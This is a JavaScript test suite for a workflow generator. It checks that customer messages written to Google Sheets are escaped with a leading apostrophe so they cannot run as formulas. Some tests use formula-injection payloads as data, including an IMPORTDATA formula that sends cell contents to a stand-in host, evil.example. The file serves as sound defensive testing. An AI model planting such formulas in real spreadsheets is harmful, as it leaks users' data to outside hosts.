/**
 * Customer text never becomes a formula in the sheet.
 *
 * Every write is USER_ENTERED, so Sheets reads a value the way it reads what
 * a person types. A message starting with `=` became a live formula. Every
 * value a workflow writes now passes through SHEET_SAFE_JS, which puts a
 * leading apostrophe on anything that would start a formula.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { SHEET_SAFE_JS, guardSheetValues, tabHeader } = require('../../scripts/setup/build-workflows');

const safe = vm.runInNewContext(SHEET_SAFE_JS);
const DIR = path.join(__dirname, '..', '..', 'n8n', 'workflows');
const WORKFLOWS = fs.readdirSync(DIR).filter((f) => f.endsWith('.json'))
  .map((f) => ({ file: f, wf: JSON.parse(fs.readFileSync(path.join(DIR, f), 'utf8')) }));

describe('SHEET_SAFE_JS', () => {
  it('keeps a formula as text', () => {
    assert.equal(safe('=IMPORTXML("https://x.example", "//a")'), '\'=IMPORTXML("https://x.example", "//a")');
    assert.equal(safe('=1+1'), "'=1+1");
  });

  it('covers every character that starts a formula', () => {
    for (const lead of ['+', '-', '@', '\t', '\r']) {
      assert.equal(safe(lead + 'x'), "'" + lead + 'x');
    }
  });

  it('leaves ordinary text, Arabic and phone numbers alone', () => {
    assert.equal(safe('بدي سعر شاحن 65 واط'), 'بدي سعر شاحن 65 واط');
    assert.equal(safe('962791234567'), '962791234567');
    assert.equal(safe('hello = world'), 'hello = world');
    assert.equal(safe(''), '');
  });

  it('never touches a number, boolean or empty value', () => {
    assert.equal(safe(-5), -5);
    assert.equal(safe(true), true);
    assert.equal(safe(null), null);
    assert.equal(safe(undefined), undefined);
  });
});

describe('guardSheetValues', () => {
  const node = () => ({
    name: 'n',
    parameters: { columns: { value: {
      text: '={{ $json.text }}',
      direction: 'outbound',
      sign: '-literal',
      mixed: '=message:{{ $json.id }}',
    } } },
  });

  it('wraps every expression, and evaluates to the guarded value', () => {
    const v = guardSheetValues(node()).parameters.columns.value;
    const inner = v.text.slice(3, -2);
    assert.equal(vm.runInNewContext(inner, { $json: { text: '=cmd' } }), "'=cmd");
    assert.equal(vm.runInNewContext(v.mixed.slice(3, -2), { $json: { id: 'wamid.1' } }), 'message:wamid.1');
  });

  it('leaves a plain literal alone and guards a literal that would start a formula', () => {
    const v = guardSheetValues(node()).parameters.columns.value;
    assert.equal(v.direction, 'outbound');
    assert.equal(v.sign, "'-literal");
  });
});

describe('every generated write is guarded', () => {
  for (const { file, wf } of WORKFLOWS) {
    for (const n of wf.nodes) {
      const value = ((n.parameters || {}).columns || {}).value;
      if (n.type === 'n8n-nodes-base.googleSheets' && value) {
        it(file + ' / ' + n.name, () => {
          for (const key of Object.keys(value)) {
            const v = value[key];
            if (typeof v !== 'string') continue;
            assert.ok(v.charAt(0) === '=' ? v.indexOf(SHEET_SAFE_JS) !== -1 : !/^[=+\-@\t\r]/.test(v),
              key + ' is not guarded: ' + v.slice(0, 60));
          }
        });
      }
      if (n.type === 'n8n-nodes-base.httpRequest' && /:append\?/.test((n.parameters || {}).url || '')) {
        it(file + ' / ' + n.name + ' (API append)', () => {
          assert.includes(n.parameters.jsonBody, SHEET_SAFE_JS);
        });
      }
    }
  }
});

describe('a hostile message through a real generated append', () => {
  it('lands in Messages as text, not as a formula', () => {
    const wf = WORKFLOWS.find((w) => w.file === '03-conversation-assignment.json').wf;
    const node = wf.nodes.find((n) => n.name === 'Append Message');
    const header = tabHeader('Messages');
    const row = { preview: '=IMPORTDATA("https://evil.example/?"&A1)', message_id: 'wamid.x' };
    const json = vm.runInNewContext(node.parameters.jsonBody.slice(3, -2), {
      $: (name) => (name === 'Sheets Access'
        ? { first: () => ({ json: { token: 't', headers: { Messages: header } } }) }
        : { item: { json: row } }),
      $now: { toISO: () => '2026-09-21T10:00:00.000+03:00' },
      $env: {},
    });
    const cells = JSON.parse(json).values[0];
    assert.equal(cells[header.indexOf('text')], '\'=IMPORTDATA("https://evil.example/?"&A1)');
    assert.equal(cells[header.indexOf('message_id')], 'wamid.x');
  });
});
